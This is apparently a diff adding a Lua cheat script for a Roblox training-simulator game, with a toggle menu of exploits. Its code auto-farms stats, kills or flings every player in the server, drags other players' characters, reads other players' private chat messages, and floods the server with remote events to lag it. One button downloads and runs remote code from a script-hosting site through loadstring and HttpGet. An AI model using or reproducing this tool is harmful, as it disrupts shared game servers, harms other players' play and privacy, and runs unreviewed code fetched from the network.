+    AutoC = Pvp:CreateToggle({Name = 'AutoC', CurrentValue = false, Flag = 'AutoC'}),
+    SpamR = Pvp:CreateToggle({Name = 'SpamR', CurrentValue = false, Flag = 'SpamR'}),
+    Stack = Pvp:CreateToggle({Name = 'Stack', CurrentValue = false, Flag = 'Stack'}),
+    FFAbuse = Pvp:CreateToggle({Name = 'Force Field Abuse', CurrentValue = false, Flag = 'ForceFieldAbuse'}),
+    Spectate = Pvp:CreateToggle({Name = 'Spectate', CurrentValue = false, Flag = 'Spectate'}),
+    SoulAttack = Pvp:CreateToggle({Name = 'Soul Attack', CurrentValue = false, Flag = 'SoulAttack'}),
+    SoulReap = Pvp:CreateToggle({Name = 'Soul Reap', CurrentValue = false, Flag = 'SoulReap'}),
+    HellFire = Pvp:CreateToggle({Name = 'Hell Fire', CurrentValue = false, Flag = 'HellFire'}),
+    SpamTP = Pvp:CreateToggle({Name = 'SpamTP', CurrentValue = false, Flag = 'SpamTP'}),
+    SitOnHead = Pvp:CreateToggle({Name = 'Sit On Head', CurrentValue = false, Flag = 'SitOnHead'}),
+    CBringAll = Pvp:CreateToggle({Name = 'CBring All', CurrentValue = false, Flag = 'CBringAll'}),
+    StackAll = Pvp:CreateToggle({Name = 'Stack All', CurrentValue = false, Flag = 'StackAll'}),
+    SoulAttackAll = Pvp:CreateToggle({Name = 'Soul Attack All', CurrentValue = false, Flag = 'SoulAttackAll'}),
+    SoulReapAll = Pvp:CreateToggle({Name = 'Soul Reap All', CurrentValue = false, Flag = 'SoulReapAll'}),
+    HellFireAll = Pvp:CreateToggle({Name = 'Hell Fire All', CurrentValue = false, Flag = 'HellFireAll'}),
+    LagS = Server:CreateToggle({Name = 'Slow', CurrentValue = false, Flag = 'LSlow'}),
+    LagN = Server:CreateToggle({Name = 'Normal', CurrentValue = false, Flag = 'LNormal'}),
+    LagF = Server:CreateToggle({Name = 'Fast', CurrentValue = false, Flag = 'LFast'}),
+    LagU = Server:CreateToggle({Name = 'Ultra', CurrentValue = false, Flag = 'LUltra'}),
+    Teleport = Server:CreateToggle({Name = 'Teleport', CurrentValue = false, Flag = 'LTeleport'}),
+    SpamX = Fun:CreateToggle({Name = 'SpamX', CurrentValue = false, Flag = 'SpamX'}),
+    SpamT = Fun:CreateToggle({Name = 'SpamT', CurrentValue = false, Flag = 'SpamT'}),
+    RgbRank = Fun:CreateToggle({Name = 'RGB Rank', CurrentValue = false, Flag = 'RGBRank'}),
+    RgbWeight = Fun:CreateToggle({Name = 'RGB Weight', CurrentValue = false, Flag = 'RGBWeight'}),
+    RgbBalls = Fun:CreateToggle({Name = 'RGB Balls', CurrentValue = false, Flag = 'RGBBalls'}),
+    RgbLasers = Fun:CreateToggle({Name = 'RGB Lasers', CurrentValue = false, Flag = 'RGBLasers'}),
+    RgbNames = Fun:CreateToggle({Name = 'RGB Names', CurrentValue = false, Flag = 'RGBNames'}),
+    BlackBalls = Fun:CreateToggle({Name = 'Black Balls', CurrentValue = false, Flag = 'BlackBalls'}),
+    BlackLasers = Fun:CreateToggle({Name = 'Black Lasers', CurrentValue = false, Flag = 'BlackLasers'}),
+    BlackName = Fun:CreateToggle({Name = 'BlackName', CurrentValue = false, Flag = 'BlackName'}),
+    Spin = Fun:CreateToggle({Name = 'Spin', CurrentValue = false, Flag = 'Spin'}),
+    Gravity = Fun:CreateToggle({Name = 'Gravity', CurrentValue = false, Flag = 'Gravity'}),
+}
+
+Toggls.Fist:OnChanged(function()
+    while Flags['Fist'] and task.wait(0) do
+        pcall(function()
+            if getfspos() ~= nil then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(getfspos())
+            end
+            for i = 1, #getfs() do
+                RemoteEvent:FireServer({getfs()[i]})
+            end
+        end)
+    end
+end)
+
+Toggls.Body:OnChanged(function()
+    while Flags['Body'] and task.wait(0) do
+        pcall(function()
+            if getbtpos() ~= nil then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(getbtpos())
+            else
+                RemoteEvent:FireServer({'+BT1'})
+            end
+        end)
+    end
+end)
+
+Toggls.Psychic:OnChanged(function()
+    while Flags['Psychic'] and task.wait(0) do
+        pcall(function()
+            if getpppos() ~= nil then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(getpppos())
+            end
+            for i = 1, #getpp() do
+                RemoteEvent:FireServer({getpp()[i]})
+            end
+        end)
+    end
+end)
+
+Toggls.JumpSpeed:OnChanged(function()
+    while Flags['JumpSpeed'] and task.wait(0) do
+        pcall(function()
+            RemoteEvent:FireServer({'Weight', 'Weight4'})
+            RemoteEvent:FireServer({'+MS5'})
+            RemoteEvent:FireServer({'+JF5'})
+        end)
+    end
+end)
+
+Toggls.Esp:OnChanged(function()
+    if Flags['Esp'] then
+        for _, v in pairs(Players:GetPlayers()) do
+            task.spawn(function()
+                if v ~= LocalPlayer then
+                    if v.Character and v.Character.Humanoid and v.Character.Humanoid.Health > 0 then
+                        CreateESP(v.Character, v)
+                    end
+                end
+            end)
+        end
+    else
+        game.CoreGui.ESPFolder:ClearAllChildren()
+    end
+end)
+
+Toggls.Highlights:OnChanged(function()
+    for _, v in pairs(Players:GetPlayers()) do
+        if v ~= LocalPlayer then
+            if Flags['Highlights'] then
+                if v.Character and v.Character.Humanoid and v.Character.Humanoid.Health > 0 then
+                    CreateHighlight(v.Character, v)
+                end
+            else
+                if v.Character then
+                    for _, v2 in pairs(v.Character:GetChildren()) do
+                        if v2.Name == 'Highlight' then
+                            v2:Destroy()
+                        end
+                    end
+                end
+            end
+        end
+    end
+end)
+
+Toggls.DayNight:OnChanged(function()
+    Lighting.ClockTime = Flags['DayNight'] and 24 or 12
+end)
+    
+Lighting:GetPropertyChangedSignal('ClockTime'):Connect(function()
+    Lighting.ClockTime = Flags['DayNight'] and 24 or 12
+end)
+
+Toggls.Quests:OnChanged(function()
+    while Flags['AutoClaimQuests'] and task.wait(0.25) do
+        pcall(function()
+            RemoteEvent:FireServer({'DLQ','MS','Claim'})
+            task.wait(0)
+            RemoteEvent:FireServer({'DLQ','PP','Claim'})
+            task.wait(0)
+            RemoteEvent:FireServer({'DLQ','FS','Claim'})
+            task.wait(0)
+            RemoteEvent:FireServer({'DLQ','BT','Claim'})
+            task.wait(0)
+            RemoteEvent:FireServer({'DLQ','JF','Claim'})
+            task.wait(0)
+            RemoteEvent:FireServer({'WLQ','PP1','Claim'})
+            task.wait(0)
+            RemoteEvent:FireServer({'WLQ','BT1','Claim'})
+            task.wait(0)
+            RemoteEvent:FireServer({'WLQ','FS1','Claim'})
+            task.wait(0)
+            RemoteEvent:FireServer({'WLQ','PP2','Claim'})
+            task.wait(0)
+            RemoteEvent:FireServer({'WLQ','BT2','Claim'})
+            task.wait(0)
+            RemoteEvent:FireServer({'WLQ','FS2','Claim'})
+            task.wait(0)
+            RemoteEvent:FireServer({'WLQ','PP3','Claim'})
+            task.wait(0)
+            RemoteEvent:FireServer({'WLQ','BT3','Claim'})
+            task.wait(0)
+            RemoteEvent:FireServer({'WLQ','FS3','Claim'})
+        end)
+    end
+end)
+
+Toggls.AnAura:OnChanged(function()
+    while Flags['AntiLag'] and task.wait(0) do
+        pcall(function()
+            for _, v in pairs(Players:GetPlayers()) do
+                for _, v2 in pairs(v.Character:GetChildren()) do
+                    if v2.Name == 'KillingIntentPart' then 
+                        v2:Destroy()
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+Toggls.AnInv:OnChanged(function()
+    while Flags['AntiInvisible'] and task.wait(0) do
+        pcall(function()
+            for _, v in pairs(Players:GetPlayers()) do
+                for _, v2 in pairs(workspace[v.Name]:GetChildren()) do
+                    if v2:IsA('BasePart') and v2.Name ~= 'HumanoidRootPart' then
+                        v2.Transparency = 0
+                    end
+                end
+            end            
+        end)
+    end
+end)
+
+Toggls.ChatSPY:OnChanged(function()
+    task.spawn(function()
+        local spy = Flags['ChatSPY']
+        local privateProperties = {Color = Color3.fromRGB(255, 255, 0), Font = 'GothamBold', TextSize = 20}
+        local StarterGui = game.StarterGui
+        local Players = Players
+        local player = Players.LocalPlayer
+        local instance = (chatSpyInstance or 0) + 1
+        local chatSpyInstance = instance
+        function onChatted(p, msg)
+            if chatSpyInstance == instance then
+                if spy then
+                    msg = msg:gsub('[\n\r]', ''):gsub('\t', ' '):gsub('[ ]+', ' ')
+                    local hidden = true
+                    local conn = ReplicatedStorage:WaitForChild('DefaultChatSystemChatEvents', math.huge):WaitForChild('OnMessageDoneFiltering', math.huge).OnClientEvent:Connect(function(packet, channel)
+                        if packet.SpeakerUserId == p.UserId and packet.Message == msg:sub(#msg - #packet.Message + 1) and (channel == 'All' or (channel == 'Team' and p.Team == player.Team)) then
+                            hidden = false
+                        end
+                    end)
+                    task.wait(1)
+                    conn:Disconnect()
+                    if hidden and spy then
+                        privateProperties.Text = '{SPY} ['.. p.Name.. ']: '.. msg
+                        StarterGui:SetCore('ChatMakeSystemMessage', privateProperties)
+                    end
+                end
+            end
+        end
+        for _, v in pairs(Players:GetPlayers()) do
+            v.Chatted:Connect(function(msg) onChatted(v, msg) end)
+        end
+        privateProperties.Text = '{SPY '.. (spy and 'EN' or 'DIS').. 'ABLED}'
+        player:WaitForChild('PlayerGui', math.huge):WaitForChild('Chat', math.huge)
+        StarterGui:SetCore('ChatMakeSystemMessage', privateProperties)
+        task.wait(3)
+        local chatFrame = player.PlayerGui.Chat.Frame
+        chatFrame.ChatChannelParentFrame.Visible = true
+        chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+    end)
+end)
+
+Toggls.CBring:OnChanged(function()
+    while Flags['CBring'] and task.wait(0) do
+        pcall(function()
+            for _, v in pairs(targets) do
+                if workspace:FindFirstChild(v) then
+                    if not LocalPlayer.Character:FindFirstChild('ForceField') and not workspace[v]:FindFirstChild('ForceField') and not workspace[v]:FindFirstChild('SafeZoneShield') and workspace[v].Humanoid.Health ~= 0 and v ~= LocalPlayer then
+                        workspace[v].HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame + LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 1
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+Toggls.AutoC:OnChanged(function()
+    while Flags['AutoC'] and task.wait(0) do
+        pcall(function()
+            RemoteEvent:FireServer({'Skill_Punch', 'Left'})
+            RemoteEvent:FireServer({'Skill_Punch', 'Right'})
+        end)
+    end
+end)
+
+Toggls.SpamR:OnChanged(function()
+    while Flags['SpamR'] and task.wait(0) do
+        pcall(function()
+            RemoteEvent:FireServer({'Skill_SpherePunch', Vector3.new(0, 1e20, 0)})
+            for _, v in pairs(workspace.Storage:GetChildren()) do
+                if v.Name == getball() then
+                    v.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
+                end
+            end
+        end)
+    end
+end)
+
+Toggls.Stack:OnChanged(function()
+    task.spawn(function()
+        if LocalPlayer.Character then
+            RemoteEvent:FireServer({'Respawn'})
+        end
+        task.wait(1.4)
+        if workspace:FindFirstChild('Town') and Flags['Stack'] then
+            workspace:FindFirstChild('Town').Parent = LocalPlayer
+        elseif LocalPlayer:FindFirstChild('Town') and not Flags['Stack'] then 
+            LocalPlayer:FindFirstChild('Town').Parent = workspace
+        end
+    end)
+    while Flags['Stack'] and task.wait(0) do
+        pcall(function()
+            RemoteEvent:FireServer({'Skill_SpherePunch', Vector3.new(0, 1e20, 0)})
+            for _, v in pairs(targets) do   
+                task.spawn(function()
+                    local target = Players[v]
+                    if target.Character and LocalPlayer.Character and (not LocalPlayer.Character:FindFirstChild('ForceField')) and (not target.Character:FindFirstChild('ForceField')) and (not target.Character:FindFirstChild('SafeZoneShield')) and LocalPlayer.Character:FindFirstChild('Humanoid') and LocalPlayer.Character.Humanoid.Health > 0 and target.Character:FindFirstChild('Humanoid') and target.Character.Humanoid.Health > 0 then
+                        target.Character.HumanoidRootPart.CFrame = CFrame.new(0, 1e5, 0)
+                        for _, sphere in pairs(workspace.Storage:GetChildren()) do
+                            task.spawn(function()
+                                if sphere.Name == getball() then
+                                    firetouchinterest(target.Character.HumanoidRootPart, sphere, 0)
+                                end
+                            end)
+                        end
+                    end
+                end)
+            end
+        end)
+    end
+end)
+
+Toggls.FFAbuse:OnChanged(function()
+    pcall(function()
+        if Flags['ForceFieldAbuse'] then
+            RemoteEvent:FireServer({'Respawn'})
+        end
+    end)
+end)
+
+Toggls.Spectate:OnChanged(function()
+    pcall(function()    
+        if Flags['Spectate'] then 
+            if Players[targets[1]].Character and Players[targets[1]].Character:FindFirstChild('Humanoid') and Players[targets[1]].Character.Humanoid.Health > 0 then
+                Camera.CameraSubject = Players[targets[1]].Character
+            end
+            diedt = Players[targets[1]].CharacterAdded:Connect(function(character)
+                Camera.CameraSubject = character:WaitForChild('Humanoid', math.huge)
+            end)
+            diedp = LocalPlayer.CharacterAdded:Connect(function()
+                if Players[targets[1]].Character and Players[targets[1]].Character:FindFirstChild('Humanoid') and Players[targets[1]].Character.Humanoid.Health > 0 then
+                    Camera.CameraSubject = Players[targets[1]].Character.Humanoid
+                end
+            end)
+            specf = Camera:GetPropertyChangedSignal('CameraSubject'):Connect(function()
+                if Players[targets[1]].Character and Players[targets[1]].Character:FindFirstChild('Humanoid') and Players[targets[1]].Character.Humanoid.Health > 0 then
+                    Camera.CameraSubject = Players[targets[1]].Character.Humanoid
+                end
+            end)
+        else
+            if diedt then
+                diedt:Disconnect()
+            end
+            if diedp then
+                diedp:Disconnect()
+            end
+            if specf then
+                specf:Disconnect()
+            end
+            Camera.CameraSubject = LocalPlayer.Character
+        end
+    end)
+end)
+
+Toggls.SoulAttack:OnChanged(function()
+    while Flags['SoulAttack'] and task.wait(0) do
+        pcall(function()
+            for _, v in pairs(targets) do
+                LocalPlayer.Character.HumanoidRootPart.CFrame = Players[v].Character.HumanoidRootPart.CFrame + Players[v].Character.HumanoidRootPart.CFrame.upVector * 40
+                RemoteEvent:FireServer({'Skill_SoulAttack_Start', Players[v]})
+                RemoteEvent:FireServer({'Skill_SoulAttack_End'})
+            end
+        end)
+    end
+end)
+
+Toggls.SoulReap:OnChanged(function()
+    while Flags['SoulReap'] and task.wait(0) do
+        pcall(function()
+            for _, v in pairs(targets)do
+                if workspace:FindFirstChild(v) then
+                    if workspace[v].Humanoid.Health > 0 and not workspace[v]:FindFirstChild('ForceField') and not workspace[v]:FindFirstChild('SafeZoneShield') then
+                        RemoteEvent:FireServer({'Skill_SoulReap', Players[v]})
+                        repeat task.wait(0) until workspace[v].Humanoid.Health == 0 or not Flags['SoulReap']
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+Toggls.HellFire:OnChanged(function()
+    while Flags['HellFire'] and task.wait(0) do
+        pcall(function()
+            for _, v in pairs(targets) do
+                if v:FindFirstChild('PrivateStats').PsychicPower.Value <= LocalPlayer:FindFirstChild('PrivateStats').PsychicPower.Value * 100 then
+                    RemoteEvent:FireServer({'Skill_DevilFlame', Players[v.Name]})
+                end
+            end
+        end)
+    end
+end)
+
+Toggls.SpamTP:OnChanged(function()
+    while Flags['SpamTP'] and task.wait(0) do
+        pcall(function()
+            for _, v in pairs(targets) do
+                LocalPlayer.Character.HumanoidRootPart.CFrame = Players[v].Character.HumanoidRootPart.CFrame
+            end
+        end)
+    end
+end)
+
+Toggls.SitOnHead:OnChanged(function()
+    while Flags['SitOnHead'] and task.wait(0) do
+        pcall(function()
+            for _, v in pairs(targets) do
+                if LocalPlayer.Character:FindFirstChild('Humanoid') then
+                    LocalPlayer.Character.Humanoid.Sit = true
+                    if workspace[v].Head then
+                        LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[v].Head.CFrame * CFrame.new(0, 2.5, 0)
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+Toggls.CBringAll:OnChanged(function()
+    while Flags['CBringAll'] and task.wait(0) do
+        pcall(function()
+            for _, v in pairs(Players:GetPlayers()) do
+                if v.Character and not LocalPlayer.Character:FindFirstChild('ForceField') and not v.Character:FindFirstChild('ForceField') and not v.Character:FindFirstChild('SafeZoneShield') and v.Character.Humanoid.Health ~= 0 and v ~= LocalPlayer then
+                    v.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame + LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 1
+                end
+            end
+        end)
+    end
+end)
+
+Toggls.StackAll:OnChanged(function()
+    while Flags['StackAll'] and task.wait(0) do
+        RemoteEvent:FireServer({'Skill_SpherePunch', Vector3.new(0, 1e20, 0)})
+        for _, v in pairs(Players:GetPlayers()) do
+            task.spawn(function()
+                pcall(function()
+                    if v ~= LocalPlayer then
+                        if v:FindFirstChild('PrivateStats').BodyToughness.Value <= LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value * 1.5 then
+                            if v.Character and LocalPlayer.Character and (not LocalPlayer.Character:FindFirstChild('ForceField')) and (not v.Character:FindFirstChild('ForceField')) and (not v.Character:FindFirstChild('SafeZoneShield')) and LocalPlayer.Character:FindFirstChild('Humanoid') and LocalPlayer.Character.Humanoid.Health > 0 and v.Character:FindFirstChild('Humanoid') and v.Character.Humanoid.Health > 0 then
+                                v.Character.HumanoidRootPart.CFrame = CFrame.new(0, 1e9, 0)
+                                for _, sphere in pairs(workspace.Storage:GetChildren()) do
+                                    task.spawn(function()
+                                        if sphere.Name == getball() then
+                                            firetouchinterest(v.Character.HumanoidRootPart, sphere, 0)
+                                        end
+                                    end)
+                                end
+                            end
+                        end
+                    end
+                end)
+            end)
+        end
+    end
+end)
+
+Toggls.SoulAttackAll:OnChanged(function()
+    while Flags['SoulAttackAll'] and task.wait(0) do
+        pcall(function()
+            for _, v in pairs(Players:GetPlayers()) do
+                if v ~= LocalPlayer then
+                    if v:FindFirstChild('PrivateStats').PsychicPower.Value <= LocalPlayer:FindFirstChild('PrivateStats').PsychicPower.Value * 10 then
+                        if not v.Character:FindFirstChild('SafeZoneShield', true) and not v.Character:FindFirstChild('ForceField', true) then
+                            LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + v.Character.HumanoidRootPart.CFrame.upVector * 40   
+                            RemoteEvent:FireServer({'Skill_SoulAttack_Start', Players[v.Name]})
+                            RemoteEvent:FireServer({'Skill_SoulAttack_End'})
+                        end
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+Toggls.SoulReapAll:OnChanged(function()
+    while Flags['SoulReapAll'] and task.wait(0) do
+        task.spawn(function()
+            pcall(function()
+                for _, v in pairs(Players:GetPlayers()) do
+                    if v ~= LocalPlayer then
+                        if v:FindFirstChild('PrivateStats').PsychicPower.Value <= LocalPlayer:FindFirstChild('PrivateStats').PsychicPower.Value * 1000 then
+                            RemoteEvent:FireServer({'Skill_SoulReap', Players[v.Name]})
+                        end
+                    end
+                end
+            end)
+        end)
+    end
+end)
+
+Toggls.HellFireAll:OnChanged(function()
+    while Flags['HellFireAll'] and task.wait(0) do
+        pcall(function()
+            for _, v in pairs(Players:GetPlayers()) do
+                if v:FindFirstChild('PrivateStats').PsychicPower.Value <= LocalPlayer:FindFirstChild('PrivateStats').PsychicPower.Value * 100 then
+                    RemoteEvent:FireServer({'Skill_DevilFlame',Players[v.Name]})
+                end
+            end
+        end)
+    end
+end)
+
+Toggls.LagS:OnChanged(function()
+    while Flags['LSlow'] and task.wait(0) do
+        pcall(function()
+            RemoteEvent:FireServer({'Skill_KillingIntent_Start', 'Start'})
+        end)
+    end
+end)
+
+Toggls.LagN:OnChanged(function()
+    while Flags['LNormal'] and task.wait(0) do
+        pcall(function()
+            for i = 1, 10 do
+                RemoteEvent:FireServer({'Skill_KillingIntent_Start', 'Start'})
+            end
+        end)
+    end 
+end)
+
+Toggls.LagF:OnChanged(function()
+    while Flags['LFast'] and task.wait(0) do
+        pcall(function()
+            for i = 1, 100 do
+                RemoteEvent:FireServer({'Skill_KillingIntent_Start', 'Start'})
+            end
+        end)
+    end 
+end)
+
+Toggls.LagU:OnChanged(function()
+    while Flags['LUltra'] and task.wait(0) do
+        pcall(function()
+            for i = 1, 1000 do
+                RemoteEvent:FireServer({'Skill_KillingIntent_Start', 'Start'})
+            end
+        end)
+    end 
+end)
+
+Toggls.Teleport:OnChanged(function()
+    while Flags['LTeleport'] and task.wait(0) do
+        pcall(function()
+            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(705, 942, 846)
+        end)
+    end
+end)
+
+Toggls.SpamX:OnChanged(function()
+    while Flags['SpamX'] and task.wait(0) do
+        pcall(function()
+            RemoteEvent:FireServer({'ConcealRevealAura', 'Start'})
+        end)
+    end
+end)
+
+Toggls.SpamT:OnChanged(function()
+    while Flags['SpamT'] and task.wait(0) do
+        pcall(function()
+            RemoteEvent:FireServer({'Skill_Invisible', 'Start'})
+        end)
+    end
+end)
+
+Toggls.RgbRank:OnChanged(function()
+    while Flags['RGBRank'] and task.wait(0) do
+        pcall(function()
+            RemoteEvent:FireServer({'ChangeRankEmblem', math.random(1, 10)})
+        end)
+    end
+end)
+
+Toggls.RgbWeight:OnChanged(function()
+    while Flags['RGBWeight'] and task.wait(0) do
+        pcall(function()
+            RemoteEvent:FireServer({'Weight', 'Weight' .. math.random(1, 4)})
+        end)
+    end
+end)
+
+Toggls.RgbLasers:OnChanged(function()
+    while Flags['RGBLasers'] and task.wait(0) do
+        pcall(function()
+            for _, v in pairs(workspace:GetChildren()) do
+                if v.Name == 'Part' then
+                    v.Transparency = 0
+                    v.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+                end
+            end
+        end)
+    end
+end)
+
+Toggls.RgbNames:OnChanged(function()
+    if Flags['RGBNames'] then
+        while Flags['RGBNames'] and task.wait(0) do 
+            for _, v in pairs(Players:GetPlayers()) do
+                pcall(function()
+                    if v.Character:FindFirstChild('Head'):FindFirstChild('NameBbGui')  then
+                        v.Character.Head.NameBbGui.NameTxt.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+                        v.Character.Head.NameBbGui.NameTxt.TextStrokeColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+                    end
+                end)
+            end
+        end
+    else
+        task.wait(.1)
+        for _, v in pairs(Players:GetPlayers()) do
+            pcall(function()
+                if v.Character:FindFirstChild('Head'):FindFirstChild('NameBbGui')  then
+                    v.Character.Head.NameBbGui.NameTxt.TextColor3 = updateColor(v.leaderstats.Status.Value)
+                    v.Character.Head.NameBbGui.NameTxt.TextStrokeColor3 = updateColorStroke(v.leaderstats.Status.Value)
+                end
+            end)
+        end
+    end
+end)
+
+Toggls.BlackLasers:OnChanged(function()
+    while Flags['BlackLasers'] and task.wait(0) do
+        pcall(function()
+            for _, v in pairs(workspace:GetChildren()) do
+                if v.Name == 'Part' then
+                    v.Transparency = 0
+                    v.Color = Color3.fromRGB(0, 0, 0)
+                end
+            end
+        end)
+    end
+end)
+
+Toggls.BlackName:OnChanged(function()
+    if Flags['BlackName'] then
+        while Flags['BlackName'] and task.wait(0) do 
+            for _, v in pairs(Players:GetPlayers()) do
+                pcall(function()
+                    if v.Character:FindFirstChild('Head'):FindFirstChild('NameBbGui')  then
+                        v.Character.Head.NameBbGui.NameTxt.TextColor3 = Color3.fromRGB(0,0,0)
+                        v.Character.Head.NameBbGui.NameTxt.TextStrokeColor3 = Color3.fromRGB(0,0,0)
+                    end
+                end)
+            end
+        end
+    else
+        task.wait(.1)
+        for _, v in pairs(Players:GetPlayers()) do
+            pcall(function()
+                if v.Character:FindFirstChild('Head'):FindFirstChild('NameBbGui')  then
+                    v.Character.Head.NameBbGui.NameTxt.TextColor3 = updateColor(v.leaderstats.Status.Value)
+                    v.Character.Head.NameBbGui.NameTxt.TextStrokeColor3 = updateColorStroke(player.leaderstats.Status.Value)
+                end
+            end)
+        end
+    end
+end)
+
+Toggls.Spin:OnChanged(function()
+    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
+        for _, v in pairs(LocalPlayer.Character.HumanoidRootPart:GetChildren()) do
+            if v.Name == 'Spin' then
+                v:Destroy()
+            end
+        end
+    end
+    if Flags['Spin'] and LocalPlayer.Character then
+        local body = Instance.new('BodyAngularVelocity')
+        body.Name = 'Spin'
+        body.Parent = LocalPlayer.Character.HumanoidRootPart
+        body.MaxTorque = Vector3.new(0, math.huge, 0)
+        body.AngularVelocity = Vector3.new(0, Flags['SpinSpeed'], 0)
+    end
+end)
+
+Toggls.Gravity:OnChanged(function()
+    if Flags['Gravity'] then
+        workspace.Gravity = Flags['GravityValue']
+    else
+        workspace.Gravity = StockGravity
+    end 
+end)
+
+
+respawnhp = 0.5
+
+local RespawnHP = Farm:CreateSlider({
+    Name = 'Respawn',
+    Range = {1, 99},
+    Increment = 1,
+    Suffix = '%',
+    CurrentValue = 50,
+    Flag = 'RespHP',
+    Callback = function()
+        respawnhp = Flags['RespHP'] / 100
+    end,
+})
+
+Farm:CreateButton({
+    Name = 'Stats Checker',
+    Callback = function()
+        for _, v in pairs(LocalPlayer.PlayerGui:GetChildren()) do
+            if v.Name == 'SPTSPlayer' then
+                v:Destroy()
+            end
+        end
+        task.spawn(function()
+            pcall(function()
+                loadstring(game:HttpGet('https://rawscripts.net/raw/Super-Power-Training-Simulator-darkhub-4134'))()
+            end)
+        end)
+    end,
+})
+
+Farm:CreateButton({
+    Name = 'Stats Counter',
+    Callback = function()
+        for _, v in pairs(game.CoreGui:GetChildren()) do
+            if v.Name == 'StatCounter' then
+                v:Destroy()
+            end
+        end
+        local StatCounter = {
+            StatCounterGui = Instance.new('ScreenGui'),
+            MainFrame = Instance.new('TextButton'),
+            MainFrameCorner = Instance.new('UICorner'),
+            TimeFrame = Instance.new('Frame'),
+            TimeFrameText = Instance.new('TextLabel'),
+            TimeFrameCorner = Instance.new('UICorner'),
+            FsFrame = Instance.new('Frame'),
+            FsFrameText = Instance.new('TextLabel'),
+            FsFrameCorner = Instance.new('UICorner'),
+            BtFrame = Instance.new('Frame'),
+            BtFrameText = Instance.new('TextLabel'),
+            BtFrameCorner = Instance.new('UICorner'),
+            PpFrame = Instance.new('Frame'),
+            PpFrameText = Instance.new('TextLabel'),
+            PpFrameCorner = Instance.new('UICorner'),
+            MsFrame = Instance.new('Frame'),
+            MsFrameText = Instance.new('TextLabel'),
+            MsFrameCorner = Instance.new('UICorner'),
+            JfFrame = Instance.new('Frame'),
+            JfFrameText = Instance.new('TextLabel'),
+            JfFrameCorner = Instance.new('UICorner'),
+            TokensFrame = Instance.new('Frame'),
+            TokensFrameText = Instance.new('TextLabel'),
+            TokensFrameCorner = Instance.new('UICorner'),
+            CloseButton = Instance.new('TextButton')
+        }
+        
+        StatCounter.StatCounterGui.Name = 'StatCounter'
+        StatCounter.StatCounterGui.Parent = game.CoreGui
+        StatCounter.StatCounterGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        StatCounter.StatCounterGui.ResetOnSpawn = false
+        
+        StatCounter.MainFrame.Name = 'MainFrame'
+        StatCounter.MainFrame.Parent = StatCounter.StatCounterGui
+        StatCounter.MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+        StatCounter.MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+        StatCounter.MainFrame.BackgroundTransparency = 0.1
+        StatCounter.MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+        StatCounter.MainFrame.Size = UDim2.new(0.25, 0, 0.28, 0)
+        StatCounter.MainFrame.Active = false
+        StatCounter.MainFrame.Text = ''
+        StatCounter.MainFrame.AutoButtonColor = false     
+        StatCounter.MainFrame.MouseButton1Down:Connect(function()
+            local Mx, My = LocalPlayer:GetMouse().X, LocalPlayer:GetMouse().Y
+            local MouseMove, MouseKill
+            MouseMove = LocalPlayer:GetMouse().Move:Connect(function()
+                local nMx, nMy = LocalPlayer:GetMouse().X, LocalPlayer:GetMouse().Y
+                local Dx, Dy = nMx - Mx, nMy - My
+                StatCounter.MainFrame.Position = StatCounter.MainFrame.Position + UDim2.fromOffset(Dx, Dy)
+                Mx, My = nMx, nMy
+            end)
+            MouseKill = UserInputService.InputEnded:Connect(function(UserInput)
+                if UserInput.UserInputType == Enum.UserInputType.MouseButton1 then
+                    MouseMove:Disconnect()
+                    MouseKill:Disconnect()
+                end
+            end)
+        end)
+        
+        StatCounter.MainFrameCorner.CornerRadius = UDim.new(0, 10)
+        StatCounter.MainFrameCorner.Name = 'MainFrameCorner'
+        StatCounter.MainFrameCorner.Parent = StatCounter.MainFrame
+        
+        StatCounter.TimeFrame.Name = 'Time'
+        StatCounter.TimeFrame.Parent = StatCounter.MainFrame
+        StatCounter.TimeFrame.AnchorPoint = Vector2.new(1, 0.5)
+        StatCounter.TimeFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        StatCounter.TimeFrame.BackgroundTransparency = 0.69
+        StatCounter.TimeFrame.BorderSizePixel = 1
+        StatCounter.TimeFrame.Position = UDim2.new(0.85, 0, 0.15, 0)
+        StatCounter.TimeFrame.Size = UDim2.new(0.7, 0, 0.15, 0)
+        
+        StatCounter.TimeFrameText.Name = 'Time'
+        StatCounter.TimeFrameText.Parent = StatCounter.TimeFrame
+        StatCounter.TimeFrameText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        StatCounter.TimeFrameText.BackgroundTransparency = 1
+        StatCounter.TimeFrameText.TextTransparency = 0
+        StatCounter.TimeFrameText.Position = UDim2.new(0, 0, 0, 0)
+        StatCounter.TimeFrameText.Size = UDim2.new(1, 0, 1, 0)
+        StatCounter.TimeFrameText.Font = 'GothamBold'
+        StatCounter.TimeFrameText.Text = ''
+        StatCounter.TimeFrameText.TextScaled = true
